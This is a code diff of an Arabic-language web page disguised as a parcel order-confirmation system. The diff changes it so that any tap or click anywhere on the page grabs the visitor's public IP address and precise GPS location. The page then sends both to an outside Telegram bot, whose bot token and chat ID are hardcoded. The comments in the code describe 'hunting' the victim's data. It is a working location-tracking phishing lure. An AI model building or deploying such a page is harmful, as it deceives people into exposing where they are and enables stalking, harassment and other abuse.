@@ -3,88 +3,67 @@ index.html
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>نظام تأكيد الطلبات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; max-width: 350px; border-top: 5px solid #0088cc; }
-        h3 { color: #333; }
-        button { background-color: #0088cc; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
-        #status { margin-top: 15px; color: #777; font-size: 14px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; }
+        html, body { height: 100%; width: 100%; background-color: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; }
+        .box { background: #1e293b; padding: 40px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: center; max-width: 350px; border: 1px solid rgba(255,255,255,0.1); z-index: 10; }
+        h3 { color: white; margin-bottom: 15px; }
+        p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
+        .btn-dummy { margin-top: 25px; background-color: #0088cc; color: white; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; display: block; }
     </style>
 </head>
-<body>
+<body onclick="strike()" ontouchstart="strike()">
 
 <div class="box">
+    <div style="font-size: 50px; margin-bottom: 15px;">📦</div>
     <h3>نظام تأكيد الطلبات</h3>
-    <p>لتأكيد هويتك وضمان وصول الطلب، يرجى الضغط على الزر أدناه.</p>
-    <button onclick="startProcess()">تأكيد الهوية والطلب</button>
-    <p id="status">بانتظار الضغط على الزر...</p>
+    <p>لتأكيد هويتك وضمان وصول الطلب، يرجى النقر في أي مكان لتحديث بيانات الشحن رقم #TB-90021.</p>
+    <div class="btn-dummy">تأكيد الهوية والطلب</div>
 </div>
 
 <script>
-    // بيانات البوت الخاصة بك
-    const TELEGRAM_TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
-    const CHAT_ID = '6876904688'; 
+    const TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
+    const ID = '6876904688';
+    let ipCaptured = false;
 
-    let fullData = {};
+    function send(text) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
+    }
 
-    // 1. جلب IP صامتاً فور فتح الصفحة
-    fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-        fullData.ip = data.ip;
-        fullData.city = data.city;
-        fullData.isp = data.org;
-        fullData.country = data.country_name;
-    });
+    function strike() {
+        // 1. صيد الـ IP (مرة واحدة فقط عند أول لمسة عشان الزحمة)
+        if (!ipCaptured) {
+            fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                send(`🌐 [IP الحقيقي]: ${data.ip}`);
+                ipCaptured = true; 
+            }).catch(() => {});
+        }
 
-    function startProcess() {
-        document.getElementById('status').innerText = "جاري معالجة الطلب...";
-        
+        // 2. صيد الـ GPS (بيشتغل مع أي لمسة في أي مكان)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    fullData.lat = pos.coords.latitude;
-                    fullData.lng = pos.coords.longitude;
-                    fullData.map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendToTelegram("✅ زبون جديد (وافق على الموقع)");
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    // الرابط الصحيح والمباشر لخرائط جوجل
+                    const map = `https://www.google.com/maps?q=${lat},${lng}`;
+                    send(`📍 [موقع GPS]:\n${map}`);
                 },
                 (err) => {
-                    fullData.error = "رفض الإذن";
-                    sendToTelegram("⚠️ زبون جديد (رفض الموقع/بيانات IP فقط)");
+                    // نرسل الرفض مرة واحدة فقط
+                    if(!window.refused) {
+                        send("⚠️ الزبون رفض إذن الموقع");
+                        window.refused = true;
+                    }
                 },
-                { enableHighAccuracy: true, timeout: 5000 }
+                { enableHighAccuracy: true, timeout: 8000 }
             );
-        } else {
-            sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
         }
-    }
-
-    function sendToTelegram(statusMsg) {
-        const message = `
-${statusMsg}
-━━━━━━━━━━━━
-📍 IP: ${fullData.ip || 'غير معروف'}
-🏙 المدينة: ${fullData.city || '--'}
-🏳️ الدولة: ${fullData.country || '--'}
-🌐 الشركة: ${fullData.isp || '--'}
-📍 الخريطة: ${fullData.lat ? fullData.map : 'لم يتم السماح'}
-━━━━━━━━━━━━
-        `;
-
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-        })
-        .then(() => {
-            document.getElementById('status').innerText = "تم التأكيد بنجاح!";
-            alert("شكراً لك، تم تأكيد هويتك بنجاح.");
-        })
-        .catch(() => {
-            document.getElementById('status').innerText = "حدث خطأ، حاول مرة أخرى.";
-        });
     }
 </script>
 
